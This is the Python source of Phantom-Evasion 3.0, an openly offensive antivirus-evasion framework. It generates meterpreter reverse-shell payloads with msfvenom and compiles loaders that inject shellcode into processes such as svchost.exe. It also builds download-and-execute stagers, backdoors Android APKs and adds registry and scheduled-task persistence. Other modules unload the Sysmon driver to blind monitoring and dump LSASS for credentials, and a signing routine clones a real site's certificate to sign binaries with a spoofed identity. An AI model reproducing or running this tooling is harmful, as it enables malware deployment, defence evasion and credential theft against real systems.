


     ########################################################################################
     #                                                                                      #
     #    This file is part of Phantom-Evasion.                                             #
     #                                                                                      #
     #    Phantom-Evasion is free software: you can redistribute it and/or modify           #
     #    it under the terms of the GNU General Public License as published by              #
     #    the Free Software Foundation, either version 3 of the License, or                 #
     #    (at your option) any later version.                                               #
     #                                                                                      #
     #    Phantom-Evasion is distributed in the hope that it will be useful,                #
     #    but WITHOUT ANY WARRANTY; without even the implied warranty of                    #
     #    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                     #
     #    GNU General Public License for more details.                                      #
     #                                                                                      #  
     #    You should have received a copy of the GNU General Public License                 #
     #    along with Phantom-Evasion.  If not, see <http://www.gnu.org/licenses/>.          #
     #                                                                                      #
     ########################################################################################


import subprocess,sys
import os,platform
import random
import string
import argparse
from OpenSSL import crypto
#from sys import argv, platform
import ssl
from time import sleep 
from shutil import rmtree
from random import shuffle
import multiprocessing
from Setup_lib import AutoSetup

sys.path.insert(0,"Modules/payloads")
sys.path.insert(0,"Modules/post-exploitation")
sys.dont_write_bytecode = True

Remote_methods = ["ThreadExecutionHijack","TEH","Processinject","PI","EarlyBird","EB","ReflectiveDll","RD","EntryPointHijack","EPH","APCSpray","APCS"]

class bcolors:
    PURPLE = '\033[95m'
    BLUE = '\033[94m'
    DARKCYAN = '\033[36m'
    GREEN = '\033[92m'
    OCRA = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def PythonBanner():
    py_version=platform.python_version()
    print(bcolors.RED + bcolors.BOLD + "[>] Using Python Version: " + bcolors.ENDC + bcolors.ENDC + py_version)

def RandString():
    return ''.join(random.SystemRandom().choice(string.ascii_lowercase + string.ascii_uppercase) for _ in range(random.randint(8,18)))

def Enter2Continue():
    try:   
        ans=input("\n[>] Press Enter to continue") 
    except SyntaxError:
        pass

    pass

def InputFunc(Text):

    py_version=platform.python_version()

    if py_version[0] == "3":
        Ans = input(Text)
    else:
        Ans = raw_input(Text)
    return Ans

def Advisor():
    print(bcolors.RED + bcolors.BOLD + "\n[<DISCLAIMER>]: " + bcolors.ENDC + bcolors.ENDC + "Phantom-Evasion is intended to be used for legal security")
    print("purposes only any other use is not under the responsibility of the developer\n") 
    sleep(0.2)
    print(bcolors.RED + bcolors.BOLD + "[>] Author:" + bcolors.ENDC + bcolors.ENDC + " Diego Cornacchini (oddcod3) \n")
    sleep(0.2)
    print(bcolors.RED + bcolors.BOLD + "[>] Github: " + bcolors.ENDC + bcolors.ENDC + "https://github.com/oddcod3 \n")
    sleep(0.2)
    print(bcolors.RED + bcolors.BOLD + "[>] Version: " + bcolors.ENDC + bcolors.ENDC + "3.0 \n")
    sleep(0.2)
    PythonBanner()
    sleep(3)
    

def Clear():
    subprocess.Popen( "cls" if platform.system() == "Windows" else "clear", shell=True)
    sleep(0.1)

def Banner():
    bann= "\n\n"
    bann += "                       _                 _                        \n" 
    bann += "                 _ __ | |__   __ _ _ __ | |_ ___  _ __ ___        \n"
    bann += "                | '_ \| '_ \ / _` | '_ \| __/ _ \| '_ ` _ \       \n"
    bann += "                | |_) | | | | (_| | | | | || (_) | | | | | |      \n"
    bann += "                | .__/|_| |_|\__,_|_| |_|\__\___/|_| |_| |_|      \n"
    bann += "                |_|   / _ \ \ / / _` / __| |/ _ \| '_ \           \n"
    bann += "                     |  __/\ V / (_| \__ \ | (_) | | | |          \n"
    bann += "                      \___| \_/ \__,_|___/_|\___/|_| |_|          \n"
    bann += "                                                        v3.0      \n"
    sleep(0.3)
    print(bcolors.RED + bcolors.BOLD + bann  + bcolors.ENDC + bcolors.ENDC)
  
def ExitBanner():

    print("      *     .--. .-,       .-..-.__                ___        *              ")
    print("  .       .'(`.-` \_.-'-./`  |\_( \"\__   *        /   \           .         ")     
    print("       __.>\ ';  _;---,._|   / __/`'--)          / \ / \                *    ")
    print("      /.--.  : |/' _.--.<|  /  | |              |   @   |       *            ")                                    
    print("  _..-'    `\     /' /`  /_/ _/_/             , |       | ,                  ")
    print(" >_.-``-. `Y  /' _;---.`|/))))      *         \/(       )\/        .         ")
    print("'` .-''. \|:  \.'   __, .-'\"`                   | )   ( |                   ")
    print(" .'--._ `-:  \/:  /'  '.\             _|_       |(     )|                    ")
    print("     /.'`\ :;   /'      `-           `-|-`      ||   | |'            *       ")
    print("    -`    |     |                      |         |   | |                     ")
    print("          :.; : |        *         .-'~^~`-.     |   | |                     ")
    print("          |:    |                .'  HEUR   `.   |   /-'                     ")
    print("          |:.   |                |   RIP     |   |_.'                        ")
    print("          :. :  |                |   here    |                               ")
    print("         ,... : ;                | 31/10/2017|                               ")
    print("-.\"-/\\\/:::.    `\.\"-._-_'.\"-\"_\\-|...........|///..-..--.-.-.-..-..-\"-..-") 


def MenuOptions():

    print("    =====================================================================")
    print("  ||"+ bcolors.OCRA + "        [MAIN MENU]" + bcolors.ENDC + ":             ||                                  || ")
    print("  ||                                 ||                                  || ")
    print("  ||    [" + bcolors.OCRA + "1" + bcolors.ENDC + "]  Windows modules         ||   [" + bcolors.OCRA + "5" + bcolors.ENDC + "]  Priv-Esc modules          || ")
    print("  ||                                 ||                                  || ")
    print("  ||    [" + bcolors.OCRA + "2" + bcolors.ENDC + "]  Linux modules           ||   [" + bcolors.OCRA + "6" + bcolors.ENDC + "]  Post-Ex modules           || ")
    print("  ||                                 ||                                  || ")
    print("  ||    [" + bcolors.OCRA + "3" + bcolors.ENDC + "]  Android modules         ||   [" + bcolors.OCRA + "7" + bcolors.ENDC + "]  Setup                     || ")
    print("  ||                                 ||                                  || ")
    print("  ||    [" + bcolors.OCRA + "4" + bcolors.ENDC + "]  Persistence modules     ||   [" + bcolors.OCRA + "0" + bcolors.ENDC + "]  Exit                      || ")
    print("  ||                                 ||                                  || ")
    print("    =====================================================================")


def PayloadAdvisor(payload,module_choice):
    if "windows" in payload:
        print("[>] Invalid Payload\n")
        print("[Warning] The following list of payloads needs to be supplied using \ncustom shellcode options:\n")
        print("> windows/format_all_drives \n> windows/exec\n> windows/download_exec \n> windows/dns_txt_query_exec \n> windows/dllinject/find_tag")
        print("> windows/vncinject/find_tag\n> windows/speak_pwned\n> windows/shell/find_tag\n> windows/patchupmeterpreter/find_tag") 
        print("> windows/patchupmeterpreter/find_tag \n> windows/patchupdllinject/find_tag\n> windows/messagebox\n> windows/loadlibrary")
        print("\n[>] including respective x64 payloads\n")
    elif "linux" in payload:
        print("[>] Invalid Payload\n")
        print("[Warning] The following list of payloads needs to be supplied using \ncustom shellcode options:\n")
        print("> linux/x86/shell_find_tag\n> linux/x86/shell_find_port\n> linux/x86/shell/find_tag\n> linux/x86/read_file \n> linux/x86/meterpreter/find_tag")
        print("> linux/x86/exec\n> linux/x86/chmod\n> linux/x86/adduser\n") 
        print("\n[>] including respective x64 payloads\n")
    Enter2Continue()
#    if ("Powershell" in module_choice):
#        powershell_completer(module_choice)
#    else:
#        shellcode_completer(module_choice)

def PayloadGenerator(msfvenom_payload,arch,Host,Port,CustomOpt,payload_format):
#def PayloadGenerator(ModOpt):

    py_version=platform.python_version()

    if payload_format == "c":

        if arch == "x86":

            ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,]

        if arch == "x64":

            ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,]

        if CustomOpt != "":

            CustomOpt=CustomOpt.split()
            ARGs += CustomOpt

        ARGs += ['-f','c']

    elif payload_format == "psh" or payload_format == "apk":

        ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch]

        if CustomOpt != "":
            CustomOpt=CustomOpt.split()
            ARGs += CustomOpt

        if payload_format == "apk":

            ARGs += ['-f','raw','-o','msf_gen.apk']
        else:
            ARGs += ['-f','psh']

    if py_version[0] == "3":

        if platform.system() == "Windows":

            Payload = subprocess.run(ARGs,shell=True, stdout=subprocess.PIPE).stdout.decode('utf-8')
        else:
            Payload = subprocess.run(ARGs,stdout=subprocess.PIPE).stdout.decode('utf-8')
    else:
        if platform.system() == "Windows":

            Payload = subprocess.check_output(ARGs,shell=True)
        else:
            Payload = subprocess.check_output(ARGs)

    return Payload

#def AutoCompiler(module_type,arch,filename,link = "",ref=False):
def AutoCompiler(M_type,ModOpt):

    Os_used = platform.system()

    if Os_used == "Linux" or Os_used == "Darwin":

        if "windows" in M_type:

            if "ReverseTcpStager_C" in M_type or "ReverseHttpStager_C" in M_type or M_type in ["WRT","WRH"]:

                ModOpt["Link"] = "winsock"

            elif "ReverseHttpsStager_C" in M_type or "DownloadExec" in M_type or M_type in ["WRS","WDD","WDE"]:

                ModOpt["Link"] = "wininet"
            else:
                ModOpt["Link"] = ""

            if ModOpt["Arch"] == "x86":

                Compiler = "i686-w64-mingw32-gcc"
            else:             
                Compiler = "x86_64-w64-mingw32-gcc"

            if ".exe" in ModOpt["Outfile"]:

                if ModOpt["Link"] == "":

                    if "ShellRes" in ModOpt and ModOpt["ShellRes"] == True:

                        subprocess.call([Compiler,ModOpt["Resfile"],'Source.c','-o',ModOpt["Outfile"],'-mwindows','-Wno-cpp'])
                    else:
                        subprocess.call([Compiler,'Source.c','-o',ModOpt["Outfile"],'-mwindows'])

                elif ModOpt["Link"] == "wininet":

                    if "ShellRes" in ModOpt and ModOpt["ShellRes"] == True:

                        subprocess.call([Compiler,ModOpt["Resfile"],'Source.c','-o',ModOpt["Outfile"],'-mwindows','-lwininet','-Wno-cpp'])
                    else:
                        subprocess.call([Compiler,'Source.c','-o',ModOpt["Outfile"],'-mwindows','-lwininet'])

                elif ModOpt["Link"] == "winsock":

                    if "ShellRes" in ModOpt and ModOpt["ShellRes"] == True:

                        subprocess.call([Compiler,ModOpt["Resfile"],'Source.c','-o',ModOpt["Outfile"],'-mwindows','-lws2_32','-Wno-cpp']) 
                    else:
                        subprocess.call([Compiler,'Source.c','-o',ModOpt["Outfile"],'-mwindows','-lws2_32','-Wno-cpp']) 

            if ".dll" in ModOpt["Outfile"]:

                if ModOpt["Link"] == "":

                    if ModOpt["Reflective"] == True:

                        if "ShellRes" in ModOpt and ModOpt["ShellRes"] == True:

                            subprocess.call([Compiler,'-c','-DBUILDING_EXAMPLE_DLL','ReflectiveLoader.c','Source.c','-mwindows','-lws2_32','-Wno-cpp'])
                            subprocess.call([Compiler,'-shared','-o',ModOpt["Outfile"],'ReflectiveLoader.o',ModOpt["Resfile"],'Source.o','-mwindows','-lws2_32','-Wno-cpp'])
                        else:
                            subprocess.call([Compiler,'-c','-DBUILDING_EXAMPLE_DLL','ReflectiveLoader.c','Source.c','-mwindows','-lws2_32','-Wno-cpp'])
                            subprocess.call([Compiler,'-shared','-o',ModOpt["Outfile"],'ReflectiveLoader.o','Source.o','-mwindows','-lws2_32','-Wno-cpp'])
                    else:

                        if "ShellRes" in ModOpt and ModOpt["ShellRes"] == True:

                            subprocess.call([Compiler,'-c','-DBUILDING_EXAMPLE_DLL','Source.c','-mwindows','-Wno-cpp'])
                            subprocess.call([Compiler,'-shared','-o',ModOpt["Outfile"],ModOpt["Resfile"],'Source.o','-mwindows','-Wno-cpp'])
                        else:
                            subprocess.call([Compiler,'-c','-DBUILDING_EXAMPLE_DLL','Source.c','-mwindows','-Wno-cpp'])
                            subprocess.call([Compiler,'-shared','-o',ModOpt["Outfile"],'Source.o','-mwindows','-Wno-cpp'])

                elif ModOpt["Link"] == "wininet":

                    if ModOpt["Reflective"] == True:

                        if "ShellRes" in ModOpt and ModOpt["ShellRes"] == True:

                            subprocess.call([Compiler,'-c','-DBUILDING_EXAMPLE_DLL','ReflectiveLoader.c','Source.c','-mwindows','-lws2_32','-lwininet','-Wno-cpp'])
                            subprocess.call([Compiler,'-shared','-o',ModOpt["Outfile"],'ReflectiveLoader.o',ModOpt["Resfile"],'Source.o','-mwindows','-lws2_32','-lwininet','-Wno-cpp'])

                        else:

                            subprocess.call([Compiler,'-c','-DBUILDING_EXAMPLE_DLL','ReflectiveLoader.c','Source.c','-mwindows','-lws2_32','-lwininet','-Wno-cpp'])
                            subprocess.call([Compiler,'-shared','-o',ModOpt["Outfile"],'ReflectiveLoader.o','Source.o','-mwindows','-lws2_32','-lwininet','-Wno-cpp'])
                    else:

                        if "ShellRes" in ModOpt and ModOpt["ShellRes"] == True:

                            subprocess.call([Compiler,'-c','-DBUILDING_EXAMPLE_DLL','Source.c','-mwindows','-lwininet','-Wno-cpp'])
                            subprocess.call([Compiler,'-shared','-o',ModOpt["Outfile"],ModOpt["Resfile"],'Source.o','-mwindows','-lwininet','-Wno-cpp'])
                        else:
                            subprocess.call([Compiler,'-c','-DBUILDING_EXAMPLE_DLL','Source.c','-mwindows','-lwininet','-Wno-cpp'])
                            subprocess.call([Compiler,'-shared','-o',ModOpt["Outfile"],'Source.o','-mwindows','-lwininet','-Wno-cpp'])

                elif ModOpt["Link"] == "winsock":

                    if ModOpt["Reflective"] == True:

                        if "ShellRes" in ModOpt and ModOpt["ShellRes"] == True:  

                            subprocess.call([Compiler,'-c','-DBUILDING_EXAMPLE_DLL','ReflectiveLoader.c','Source.c','-mwindows','-lws2_32','-Wno-cpp'])
                            subprocess.call([Compiler,'-shared','-o',ModOpt["Outfile"],'ReflectiveLoader.o',ModOpt["Resfile"],'Source.o','-mwindows','-lws2_32','-Wno-cpp'])
                        else:                  
                            subprocess.call([Compiler,'-c','-DBUILDING_EXAMPLE_DLL','ReflectiveLoader.c','Source.c','-mwindows','-lws2_32','-Wno-cpp'])
                            subprocess.call([Compiler,'-shared','-o',ModOpt["Outfile"],'ReflectiveLoader.o','Source.o','-mwindows','-lws2_32','-Wno-cpp'])
                    else:

                        if "ShellRes" in ModOpt and ModOpt["ShellRes"] == True:

                            subprocess.call([Compiler,'-c','-DBUILDING_EXAMPLE_DLL','Source.c','-mwindows','-lws2_32','-Wno-cpp'])
                            subprocess.call([Compiler,'-shared','-o',ModOpt["Outfile"],ModOpt["Resfile"],'Source.o','-mwindows','-lws2_32','-Wno-cpp'])
                        else:     
                            subprocess.call([Compiler,'-c','-DBUILDING_EXAMPLE_DLL','Source.c','-mwindows','-lws2_32','-Wno-cpp'])
                            subprocess.call([Compiler,'-shared','-o',ModOpt["Outfile"],'Source.o','-mwindows','-lws2_32','-Wno-cpp'])


        elif "linux" in M_type and ModOpt["Arch"] == "x86":

            subprocess.call(['gcc','Source.c','-lm','-o',ModOpt["Outfile"],'-lpthread','-m32','-static'])

        elif "linux" in M_type and ModOpt["Arch"] == "x64":

            subprocess.call(['gcc','Source.c','-lm','-o',ModOpt["Outfile"],'-lpthread','-static'])

    elif Os_used == "Windows":

        if "windows" in M_type and ModOpt["Arch"] == "x86":

            filename += ".exe"

            if link == "":

                subprocess.call(['gcc','Source.c','-o',ModOpt["Outfile"],'-mwindows','-m32','-no-pie'],shell=True)
            
            elif link == "wininet":

                subprocess.call(['gcc','Source.c','-o',ModOpt["Outfile"],'-mwindows','-m32','-no-pie','-lwininet'],shell=True)

            elif link == "winsock":

                subprocess.call(['gcc','Source.c','-o',ModOpt["Outfile"],'-mwindows','-m32','-no-pie','-lws2_32'],shell=True)

        elif "windows" in M_type and ModOpt["Arch"] == "x64":

            if link == "":

                subprocess.call(['gcc','Source.c','-o',ModOpt["Outfile"],'-mwindows','-no-pie'],shell=True)
            
            elif link == "wininet":

                subprocess.call(['gcc','Source.c','-o',ModOpt["Outfile"],'-mwindows','-no-pie','-lwininet'],shell=True)

            elif link == "winsock":

                subprocess.call(['gcc','Source.c','-o',ModOpt["Outfile"],'-mwindows','-no-pie','-lws2_32'],shell=True)

        elif "linux" in M_type and ModOpt["Arch"] == "x86":

            print("Autocompile not supported use cygwin to compile source code")

        elif "linux" in M_type and ModOpt["Arch"] == "x64":

            print("Autocompile not supported use cygwin to compile source code")

def StripBin(ModOpt):

    if ModOpt["Strip"] == True:

        print(bcolors.GREEN + "\n[>] Strip binary...\n" + bcolors.ENDC)

        subprocess.call(['strip',ModOpt["Outfile"]])


def ExeSigner(Filename,Spoofcert,descr="Notepad Benchmark Util"):
    print(bcolors.OCRA + bcolors.BOLD + "\n[>] Sign Executable \n" + bcolors.ENDC + bcolors.ENDC)
    cert_dir = ""
    cert_ready=False

    if os.path.exists("Setup/Sign_certs") and (len(os.listdir("Setup/Sign_certs")) > 1):

        CertsList = os.listdir("Setup/Sign_certs")
                
        for certfile in CertsList:

            if Spoofcert.split(":")[0] in certfile:

                ClonedCert="Setup/Sign_certs/" + certfile[:-4] + ".crt"
                ClonedKey = "Setup/Sign_certs/"  + certfile[:-4] +  ".key"
                PfxFile = "Setup/Sign_certs/" + certfile[:-4] + ".pfx"
                cert_ready=True
                break

    elif not os.path.exists("Setup/Sign_certs"):

        os.makedirs("Setup/Sign_certs")
               
    if not cert_ready:

        host = Spoofcert.split(":")[0]
        port = int(Spoofcert.split(":")[1] or "443")
        online_cert = ssl.get_server_certificate((host,port))
        x509 = crypto.load_certificate(crypto.FILETYPE_PEM, online_cert)
        keygen = crypto.PKey()
        keygen.generate_key(crypto.TYPE_RSA, ((x509.get_pubkey()).bits()))
        cert = crypto.X509()
        ClonedCert = "Setup/Sign_certs/" + host + ".crt"
        ClonedKey = "Setup/Sign_certs/" + host + ".key"
        PfxFile = "Setup/Sign_certs/" + host + ".pfx"
        cert.set_version(x509.get_version())
        cert.set_serial_number(x509.get_serial_number())
        cert.set_subject(x509.get_subject())
        cert.set_issuer(x509.get_issuer())
        cert.set_notBefore(x509.get_notBefore())
        cert.set_notAfter(x509.get_notAfter())
        cert.set_pubkey(keygen)
        cert.sign(keygen, 'sha256')
        pfx = crypto.PKCS12Type()
        pfx.set_privatekey(keygen)
        pfx.set_certificate(cert)
        pfxdata = pfx.export()
        open(ClonedCert, "wt").write(crypto.dump_certificate(crypto.FILETYPE_PEM, cert).decode('utf-8'))
        open(ClonedKey, "wt").write(crypto.dump_privatekey(crypto.FILETYPE_PEM, keygen).decode('utf-8'))
        open((PfxFile), 'wb').write(pfxdata)

    if (platform.system() == "Windows"):

        print("\n[>] Signing " + Filename + " with signtool.exe...")
        print(subprocess.check_output("signtool.exe sign /v /f " + PfxFile + " /d \"" + descr + "\" /tr \"http://sha256timestamp.ws.symantec.com/sha256/timestamp\" /td SHA256 /fd SHA256 " + Filename, shell=True).decode())

    else:
        Fileform=Filename.split(".")
        Tmpfile="Ready2Sign." + Fileform[len(Fileform)-1]
        os.rename(Filename,Tmpfile)
        print("\n[>] Signing " + Filename + " with osslsigncode...")
        args = ("osslsigncode", "sign", "-pkcs12", PfxFile, "-n", descr, "-i", "http://sha256timestamp.ws.symantec.com/sha256/timestamp", "-in", Tmpfile, "-out",Filename)
        popen = subprocess.Popen(args, stdout=subprocess.PIPE)
        popen.wait()
        output = popen.stdout.read()
        os.remove(Tmpfile)
        print("\n[>] " + output.decode('utf-8'))


def ResGen(ModOpt):

    RandRC = RandString()
    RandBin = RandString()

    ModOpt["ResType"] = ''.join(random.SystemRandom().choice(string.ascii_uppercase) for _ in range(random.randint(5,12)))

    RCfd = open(RandRC + ".rc","w")
    RCfd.write(str(random.randint(10,1000)) + " " + ModOpt["ResType"] + " " + RandBin + ".bin")
    RCfd.close()

    BINfd = open(RandBin + ".bin","w")

    if platform.python_version()[0] == 3:

        BINfd.write(ModOpt["Payload"].decode('string-escape'))
    else:
        BINfd.write(ModOpt["Payload"].encode('latin-1'))

    BINfd.close()

    ModOpt["Rcfile"] = RandRC + ".rc"
    ModOpt["Resfile"] = RandRC + ".rs"
    ModOpt["Binfile"] = RandBin + ".bin"

    if ModOpt["Arch"] == "x86":

        os.system("i686-w64-mingw32-windres " + RandRC + ".rc -O coff -o " + RandRC + ".rs")

    else:

        os.system("x86_64-w64-mingw32-windres " + RandRC + ".rc -O coff -o " + RandRC + ".rs")

def PayloadOpt(M_type,Arch):

    if "windows" in M_type:

        if Arch == "x86":

            Payload=InputFunc("\n[>] Insert msfvenom payload (default: windows/meterpreter/reverse_tcp):") or "windows/meterpreter/reverse_tcp"

        elif Arch == "x64":

             Payload=InputFunc("\n[>] Insert msfvenom payload (default: windows/x64/meterpreter/reverse_tcp):") or "windows/x64/meterpreter/reverse_tcp"

    elif "linux" in M_type:

        if Arch == "x86":

            Payload=InputFunc("\n[>] Insert msfvenom payload (default: linux/x86/meterpreter/reverse_tcp):") or "linux/x86/meterpreter/reverse_tcp"

        elif Arch == "x64":

            Payload=InputFunc("\n[>] Insert msfvenom payload (default: linux/x64/meterpreter/reverse_tcp):") or "linux/x64/meterpreter/reverse_tcp"

    elif "android" in M_type:

        Payload=InputFunc("\n[>] Insert msfvenom payload (default: android/meterpreter/reverse_tcp):") or "android/meterpreter/reverse_tcp"

    if "reverse" in Payload:

        Host="LHOST=" + InputFunc("\n[>] Insert LHOST: ")
        Port="LPORT=" + InputFunc("\n[>] Insert LPORT: ")
        CustomOpt=InputFunc("\n[>] Custom msfvenom options(default: empty): ")

        return (Payload,Host,Port,CustomOpt)

    elif "bind" in Payload:

        Host="RHOST=" + InputFunc("\n[>] Insert RHOST: ")
        Port="RPORT=" + InputFunc("\n[>] Insert RPORT: ")
        CustomOpt=InputFunc("\n[>] Custom msfvenom options(default: empty): ")

        return (Payload,Host,Port,CustomOpt)

    else:
        payload_advisor(payload_choice,module_choice)
        PayloadOpt(M_type,Arch)

        return None

def LoadExecModule(M_type,ModOpt):

    if "Reflective" in ModOpt and ModOpt["Reflective"] == True:

        from BuildReflectiveLoader_C_windows import BuildReflectiveLoader
        BuildReflectiveLoader(ModOpt)

    if "ShellcodeInjection_C_windows" in M_type:

        from ShellcodeInjection_C_windows import ShellInject_C_windows
        ShellInject_C_windows(ModOpt)

    elif "ShellcodeInjection_C_linux" in M_type:

        from ShellcodeInjection_C_linux import ShellInject_C_linux
        ShellInject_C_linux(ModOpt)

    elif "ReverseTcpStager_C" in M_type:

        from Meterpreter_ReverseTcpStager_C_windows import RevTcpStager_C_windows
        RevTcpStager_C_windows(ModOpt)

    elif "ReverseHttpStager_C" in M_type:

        from Meterpreter_ReverseHttpStager_C_windows import RevHttpStager_C_windows
        RevHttpStager_C_windows(ModOpt)

    elif "ReverseHttpsStager_C" in M_type:

        from Meterpreter_ReverseHttpsStager_C_windows import RevHttpsStager_C_windows
        RevHttpsStager_C_windows(ModOpt)

    elif "DownloadExecExe_C" in M_type:

        from DownloadExecExe_C_windows import DownloadExecExe_C_windows
        DownloadExecExe_C_windows(ModOpt)

    elif "DownloadExecDll_C" in M_type:

        from DownloadExecDll_C_windows import DownloadExecDll_C_windows
        DownloadExecDll_C_windows(ModOpt)

    elif "MsfvenomObfuscateBackdoor" in M_type:

        from MsfvenomObfuscateBackdoor_android import ApkSmaliObfuscator_android
        ApkSmaliObfuscator_android(ModOpt)

    elif "Persistence_CMD_REG_windows" in M_type:

        from Persistence_CMD_REG_windows import Persistence_CMD_REG_windows
        Persistence_CMD_REG_windows(ModOpt)

    elif "Persistence_C_REG_windows" in M_type:

        from Persistence_C_REG_windows import Persistence_C_REG_windows
        Persistence_C_REG_windows(ModOpt)

    elif "Persistence_CMD_Schtasks_windows" in M_type:

        from Persistence_CMD_Schtasks_windows import Persistence_CMD_Schtasks_windows
        Persistence_CMD_Schtasks_windows(ModOpt)

    elif "Persistence_C_KeepAliveProcess_windows" in M_type:

        from Persistence_C_KeepProcessAlive_windows import Persistence_C_KeepAliveProcess_windows
        Persistence_C_KeepAliveProcess_windows(ModOpt)

    elif "Persistence_CMD_CreateService_windows" in M_type:

        from Persistence_CMD_CreateService_windows import Persistence_CMD_CreateService_windows
        Persistence_CMD_CreateService_windows(ModOpt)

    elif "Privesc_C_DuplicateTokenEx_windows" in M_type:

        from Privesc_C_DuplicateTokenEx_windows import Privesc_C_DuplicateTokenEx_windows
        Privesc_C_DuplicateTokenEx_windows(ModOpt)

    elif "Postex_CMD_UnloadSysmonDriver_windows" in M_type:

        from Postex_CMD_UnloadSysmonDriver_windows import Postex_CMD_UnloadSysmonDriver_windows
        Postex_CMD_UnloadSysmonDriver_windows(ModOpt)

    elif "Postex_C_UnloadSysmonDriver_windows" in M_type:

        from Postex_C_UnloadSysmonDriver_windows import Postex_C_UnloadSysmonDriver_windows
        Postex_C_UnloadSysmonDriver_windows(ModOpt)

    elif "Postex_CMD_AttribHideFile_windows" in M_type:

        from Postex_CMD_AttribHideFile_windows import Postex_CMD_AttribHideFile_windows
        Postex_CMD_AttribHideFile_windows(ModOpt)

    elif "Postex_C_SetFileAttributeHidden_windows" in M_type:

        from Postex_C_SetFileAttributeHidden_windows import Postex_C_SetFileAttributeHidden_windows
        Postex_C_SetFileAttributeHidden_windows(ModOpt)

    elif "Postex_C_MiniDumpWriteDumpLsass_windows" in M_type:

        from Postex_C_MiniDumpWriteDumpLsass_windows import Postex_C_DumpLsass_windows
        Postex_C_DumpLsass_windows(ModOpt)

    elif "Postex_CMD_DumpLsass_windows" in M_type:

        from Postex_CMD_comsvcsdllDumpLsass_windows import Postex_CMD_DumpLsass_windows
        Postex_CMD_DumpLsass_windows(ModOpt)

    else:
        print("ModuleNotFound!!!\n\n")
        sleep(1000)

def ModuleOpt(M_type):

    Remote_methods = ["ThreadExecutionHijack","TEH","Processinject","PI","APCSpray","APCS","ReflectiveDll","RD","EarlyBird","EntryPointHijack","EPH"]
    ModOpt={}

    if "_C_" in M_type:

        ModOpt["Arch"]=InputFunc("\n[>] Insert Target architecture (default:x86):") or "x86"

    if "Stager" in M_type:

        ModOpt["Lhost"] = InputFunc("\n[>] Insert LHOST: ")
        ModOpt["Lport"] = InputFunc("\n[>] Insert LPORT: ")

    elif "ShellcodeInjection" in M_type or "android" in M_type:

        if not "android" in M_type:

            ModOpt["Shelltype"] = InputFunc("\n[>] Insert shell generation method (default: msfvenom):") or "msfvenom"

        else:
            ModOpt["Shelltype"] = "msfvenom"
            ModOpt["Arch"] = "dalvik"

        if "windows" in M_type: 

            ModOpt["ShellRes"] = YesOrNo(InputFunc("\n[>] Embed shellcode as PE resource? (Y/n): "))

        if ModOpt["Shelltype"] == "msfvenom":

            PayloadData=PayloadOpt(M_type,ModOpt["Arch"])
            ModOpt["Payload"] = PayloadData[0]
            ModOpt["Host"] = PayloadData[1]
            ModOpt["Port"] = PayloadData[2]
            ModOpt["CustomOpt"] = PayloadData[3]

        elif ModOpt["Shelltype"] == "custom":

            ModOpt["Payload"] = InputFunc("\n[>] Insert custom shellcode (example: \\xc0\\xff\\xee\\xee):")

        if not "android" in M_type:

            ModOpt["Encode"] = SelectEncryption("Payload")

    elif "DownloadExec" in M_type:

        ModOpt["cryptFile"] = YesOrNo(InputFunc("\n[>] Add file encryption/run-time decryption(Y/n): "))

        if ModOpt["cryptFile"] == True:

            ModOpt["cryptFile"]=InputFunc("\n[>] Insert filename to encrypt and download: ")

            ModOpt["Encode"] = SelectEncryption("File")
        else:
            ModOpt["Encode"] = "1"

        ModOpt["UrlTarget"]=InputFunc("\n[>] Insert Url to connect for download: ")
        #ModOpt["Fileformat"]=InputFunc("\n[>] Insert Fileformat to exec (default:exe): ")  or "exe"

        if "DownloadExecExe" in M_type:

            ModOpt["ExecMethod"]=InputFunc("\n[>] Insert Exec-method (default:ProcessHollowing): ") or "ProcessHollowing"
            ModOpt["ProcTarget"]=InputFunc("\n[>] Insert target process filepath (default:svchost.exe): ") or "svchost.exe"
            
        elif "DownloadExecDll" in M_type:
            
            ModOpt["ExecMethod"]=InputFunc("\n[>] Insert Exec-method (default:ReflectiveDll): ") or "ReflectiveDll"

            if ModOpt["ExecMethod"] in ["ReflectiveDll","RD","RDAPC","RDTC","ManualMap","MM"]:
 
                if (ModOpt["Arch"] == "x86"):

                    ModOpt["ProcTarget"] = InputFunc("\n[>] Insert x86 target process (default: OneDrive.exe):") or "OneDrive.exe"

                elif ModOpt["Arch"] == "x64":

                    ModOpt["ProcTarget"] = InputFunc("\n[>] Insert x64 target process (default: SkypeApp.exe):") or "SkypeApp.exe"

        ModOpt["Filesize"]=InputFunc("\n[>] Insert size in byte of the file to download (default:1000000): ") or "1000000" 

    if "Stager" in M_type or "ShellcodeInjection" in M_type:

        ModOpt["ExecMethod"] = InputFunc("\n[>] Insert Exec-method (default:Thread):") or "Thread"

        if "windows" in M_type:

            ModOpt["MemAlloc"] = InputFunc("\n[>] Insert Memory allocation type (default:Virtual_RWX):") or "Virtual_RWX"
        else:
            ModOpt["MemAlloc"] = InputFunc("\n[>] Insert Memory allocation type (default:Virtual_RWX):") or "Heap_RWX"
                       
        if ModOpt["ExecMethod"] in Remote_methods:

            if (ModOpt["Arch"] == "x86"):

                if ModOpt["ExecMethod"] in ["EarlyBird","EB","EntryPointHijack","EPH"]:

                    ModOpt["ProcTarget"] = InputFunc("\n[>] Insert target process filepath (default: svchost.exe):") or "svchost.exe"
                else:
                    ModOpt["ProcTarget"] = InputFunc("\n[>] Insert x86 target process (default: OneDrive.exe):") or "OneDrive.exe"

            elif ModOpt["Arch"] == "x64":

                if ModOpt["ExecMethod"] in ["EarlyBird","EB","EntryPointHijack","EPH"]:

                    ModOpt["ProcTarget"] = InputFunc("\n[>] Insert target process filepath (default: svchost.exe):") or "svchost.exe"
                else:
                    ModOpt["ProcTarget"] = InputFunc("\n[>] Insert x64 target process (default: SkypeApp.exe):") or "SkypeApp.exe"

    if "android" in M_type:

        ModOpt["BackdoorApk"]=YesOrNo(InputFunc("\n[>] Inject backdoor into another apk?(default:Y/n): "))

        if ModOpt["BackdoorApk"] == True:

            ModOpt["BackdoorApk"] = InputFunc("\n[>] Insert apk filename to backdoor: ")
            ModOpt["RunOnAppStart"] = True #YesOrNo(InputFunc("\n[>] Trigger payload on apk execution? (default:Y/n): "))
            #ModOpt["RebootPersistence"] = YesOrNo(InputFunc("\n[>] Add Reboot Persistence? (default:Y/n): "))

